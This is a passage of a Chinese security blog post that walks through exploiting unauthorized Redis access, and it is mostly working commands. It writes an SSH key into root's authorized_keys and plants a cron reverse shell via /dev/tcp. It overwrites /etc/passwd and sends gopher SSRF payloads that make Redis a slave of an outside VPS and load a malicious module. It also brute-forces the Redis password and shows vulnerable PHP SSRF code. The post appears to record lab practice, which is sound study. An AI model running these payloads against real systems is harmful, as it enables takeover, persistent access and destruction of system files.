+<p>发现能成功写入，由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120155804353.png"
+                      alt="image-20240120155804353"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120160329810.png"
+                      alt="image-20240120160329810"
+                ></p>
+<h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p>
+<p>如果目标没有web服务，但是开启了ssh且允许免密登录的话，可以尝试这种方法。</p>
+<p>原理和前面一样的，只是备份的目录和文件名修改为&#x2F;root&#x2F;.ssh&#x2F;目录和authorized_keys文件名。</p>
+<p>先在服务器中生成公私钥：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120160955642.png"
+                      alt="image-20240120160955642"
+                ></p>
+<p>获取公钥内容<code>cat /home/kali/.ssh/id_rsa.pub</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRONYAUcEiNMRqrK2szP6zN4bM9IrwV9A0fq6xe2L+3zOsIGoeaMr/hmmYeiRd8/zkG7qhTZyf+ccZK22g2Yfp0kMXHwuRif8fejGueuNvqRKiOYQRsNB78NUDnfM2So60173MF7TTTo76EZCFnjyxce8W3XohvtlTObK/rdIxpIGnQjpsVXCG8TiL5MwquLsiCsowVUe+Z0OtZiYNAQPFvaWHDZfIhTfeYUApdaSzPSFb3vhB6WOz53TVaaglzehlqJCrE1dI04XyLIn/ysiXgKErCU8AjH8N/iAetVKJN0dla4JgGW9oDslY8DoJnk17kunsUkCS57aWlG91+5Yt0MZD4N/1ETTq9zfJmjlhmAFOpBBksmNpPkKtJTEYsGqDPseQjlkA4m8zMpPPYCpNw4N4Ozs9ImGmWaWdOtPRAPQnTTgcyVLfWYj0+BqrgiO7CMYRZPu4iQafYJmNCNRe21modsRpx9ry0fE1zTuKWpR8TB17gxey41ktLvmRJW0= kali@kali</span><br></pre></td></tr></table></figure></div>
+
+<p>通过Redis客户端将公钥内容写入到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRONYAUcEiNMRqrK2szP6zN4bM9IrwV9A0fq6xe2L+3zOsIGoeaMr/hmmYeiRd8/zkG7qhTZyf+ccZK22g2Yfp0kMXHwuRif8fejGueuNvqRKiOYQRsNB78NUDnfM2So60173MF7TTTo76EZCFnjyxce8W3XohvtlTObK/rdIxpIGnQjpsVXCG8TiL5MwquLsiCsowVUe+Z0OtZiYNAQPFvaWHDZfIhTfeYUApdaSzPSFb3vhB6WOz53TVaaglzehlqJCrE1dI04XyLIn/ysiXgKErCU8AjH8N/iAetVKJN0dla4JgGW9oDslY8DoJnk17kunsUkCS57aWlG91+5Yt0MZD4N/1ETTq9zfJmjlhmAFOpBBksmNpPkKtJTEYsGqDPseQjlkA4m8zMpPPYCpNw4N4Ozs9ImGmWaWdOtPRAPQnTTgcyVLfWYj0+BqrgiO7CMYRZPu4iQafYJmNCNRe21modsRpx9ry0fE1zTuKWpR8TB17gxey41ktLvmRJW0= kali@kali\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>到自己之前生成的私钥下面去，可以使用命令利用这个私钥进行连接服务端 root，得到shell：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.13.128</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120161654223.png"
+                      alt="image-20240120161654223"
+                ></p>
+<h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通（所以没有装centos的我就没有复现了）。原因如下：</p>
+<ul>
+<li>权限问题，Ubuntu定时任务需要root权限；</li>
+<li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li>
+</ul>
+<p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">13</span>.<span class="number">128</span>/<span class="number">5555</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+<p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p>
+<p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120162328658.png"
+                      alt="image-20240120162328658"
+                ></p>
+<p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120162418179.png"
+                      alt="image-20240120162418179"
+                ></p>
+<p>具体CentOS的利用可自行测试。</p>
+<p>不同OS的系统任务调度文件：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可进行利用的cron有如下几个地方：</p>
+<ul>
+<li>&#x2F;etc&#x2F;crontab 这个是肯定的</li>
+<li>&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件</li>
+<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件</li>
+</ul>
+</blockquote>
+<p>还有师傅是这么解释的：</p>
+<blockquote>
+<p><strong>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</strong></p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+</blockquote>
+<h4 id="写入-etc-passwd文件实现任意账号密码重置"><a href="#写入-etc-passwd文件实现任意账号密码重置" class="headerlink" title="写入&#x2F;etc&#x2F;passwd文件实现任意账号密码重置"></a>写入&#x2F;etc&#x2F;passwd文件实现任意账号密码重置</h4><p><font color="red"><strong>这个对系统影响比较大，我没有去复现</strong></font></p>
+<p>Linux存账户密码一般会有&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow，如果两个出现冲突的话，会以&#x2F;etc&#x2F;passwd为准。<br>另外，&#x2F;etc&#x2F;passwd的权限一般是644，比&#x2F;etc&#x2F;shadow的640要高。而且，redis写入是覆盖的，也就是说，写入进去覆盖之后，其他的都没了，这个过程是有创且不可逆的。<br>但是可以通过与&#x2F;etc&#x2F;passwd- 和&#x2F;etc&#x2F;shadow对比，起码可恢复99%的内容。当然，做这步骤前事先和负责人联系，得到许可后自然是最好的，都可以省的恢复了。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd --method=md5 --salt=&#x27;$6$my0salt0&#x27; &#x27;YourNewPasswd%1024&#x27; 	//使用mkpasswd生成密码，或者用下面这个python</span><br><span class="line">python3 -c &#x27;import crypt; print(crypt.crypt(&quot;YourNewPasswd%1024&quot;, &quot;$6$my0salt0&quot;))&#x27;</span><br><span class="line"></span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename passwd 								//将生成的MD5写入到/etc/passwd中</span><br><span class="line">SET abcd &quot;\n\n root:$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.:0:0:root:/root:/bin/bash\nsshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n&quot;</span><br><span class="line"></span><br><span class="line">//要想ssh登录root账号，除了写入root之外，还需要写入sshd账号sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+<p>然后登录</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.13.128</span><br></pre></td></tr></table></figure></div>
+
+<p>输入明文密码 <code>YourNewPasswd%1024</code> ,成功登录</p>
+<h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tatsumaki.cn/2020/08/20/redis/#toc-heading-9" >https://tatsumaki.cn/2020/08/20/redis/#toc-heading-9 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>写入Windows启动项：<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170360#h3-3" >https://www.anquanke.com/post/id/170360#h3-3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>写入Windows MOF：<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170360#h3-4" >https://www.anquanke.com/post/id/170360#h3-4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p>
+<p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p>
+<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p>
+<p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p>
+<p>Redis主从数据库之间的同步分为两种：</p>
+<ul>
+<li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li>
+<li>部分复制只是将写命令发送给从机；</li>
+</ul>
+<p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p>
+<p>这里我们只需要模拟协议收发包就能伪装成Redis主机了</p>
+<h5 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure></div>
+
+<p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p>
+<p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p>
+<p>然后在攻击者机器上执行如下命令即可成功RCE：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.13.128 -p 6379 -L 192.168.13.128 -f module.so</span><br></pre></td></tr></table></figure></div>
+
+<p>我本地是redis 7.2.4 的，加载模块会出错，我看某些说的需要在5.0.5及以下版本的才行，我没有做尝试。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120192456256.png"
+                      alt="image-20240120192456256"
+                ></p>
+<h5 id="手打"><a href="#手打" class="headerlink" title="手打"></a>手打</h5><p>因为大多数情况不会直接是未授权的漏洞，通常结合ssrf或者其他漏洞，因此工具具有很大的局限性，这里给出手打的payload，方便在各种情况下进行攻击。</p>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>（不需要认证时可以把auth root删掉）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br><span class="line">//设置备份文件路径为/tmp/ 试了很多目录，最后发现只有/tmp有权限写入。</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 43.138.0.3 6666</span><br><span class="line">quit</span><br><span class="line">//设置备份文件名为：exp.so，设置主redis地址为43.138.0.3，端口为6666 地址为自己的VPS</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%252043.138.0.3%25206666%250Aquit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">quit</span><br><span class="line">//导入 exp.so</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520%252Ftmp%252Fexp.so%250Aquit</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>还有的payload为：</p>
+<p><strong>关闭主从同步</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">slaveof NO ONE</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>导出数据库</strong><br>（设置备份文件名字）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>不出网 – 命令执行获取flag</strong></p>
+<p>使用 exp.so</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>
+
+<p>使用 exp2.so</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aRedisRuntime.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">RedisRuntime.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>出网 – 反弹shell</strong></p>
+<p>使用 exp2.so</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250ARedisRuntime.exec%252043.138.0.3%25202740%250Aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">RedisRuntime.exec 43.138.0.3 2740</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>公网使用 Awsome-Redis-Rogue-Server 来开启redis 主服务</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -<span class="built_in">path</span> exp.so -lport <span class="number">6666</span></span><br><span class="line"></span><br><span class="line">python3 redis_rogue_server.py -v -<span class="built_in">path</span> exp2.so -lport <span class="number">6666</span></span><br></pre></td></tr></table></figure></div>
+
+<p>如果要反弹shell则也开启nc监听</p>
+<p>然后在漏洞处注入payload即可</p>
+<h3 id="暴力破解Redis密码"><a href="#暴力破解Redis密码" class="headerlink" title="暴力破解Redis密码"></a>暴力破解Redis密码</h3><h4 id="用Hydra"><a href="#用Hydra" class="headerlink" title="用Hydra"></a>用Hydra</h4><p>使用Hydra工具可以对Redis密码进行暴力破解：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P ./passwords.txt redis://192.168.13.128</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="用python"><a href="#用python" class="headerlink" title="用python"></a>用python</h4><p>面对内网 redis 认证的情况下，可以利用 dict 或者 gopher 等协议编写脚本尝试爆破 Redis 口令。可以再用多线程进行优化一下，由于有Hydra了，就不去改这个了，懂意思就行。</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;dict://127.0.0.1:6379/auth:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;./top100.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        passwd = f.readline()</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;+OK\\r\\n+OK\\r\\n&quot;</span>.encode() <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;redis passwd:&quot;</span> + passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h2 id="6-漏洞组合"><a href="#6-漏洞组合" class="headerlink" title="6.漏洞组合"></a>6.漏洞组合</h2><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p>
+<p>一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis</p>
+<p><strong>常见存在ssrf的例子</strong></p>
+<p><strong>curl</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//创建新的 cURL 资源</span></span><br><span class="line">curl\<span class="title function_ invoke__">_setopt</span>(<span class="variable">$ch</span>, CURLOPT\_URL, <span class="variable">$_GET</span>\[<span class="string">&#x27;url&#x27;</span>\]); <span class="comment">//设置URL 和相应的选项</span></span><br><span class="line"><span class="comment"># curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl\<span class="title function_ invoke__">_setopt</span>(<span class="variable">$ch</span>, CURLOPT\_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment"># curl\_setopt($ch, CURLOPT\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);   <span class="comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">//关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>或</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p> <strong>file_get_contents</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>需要使用的redis指令是（和之前写马的是一样的）：</p>
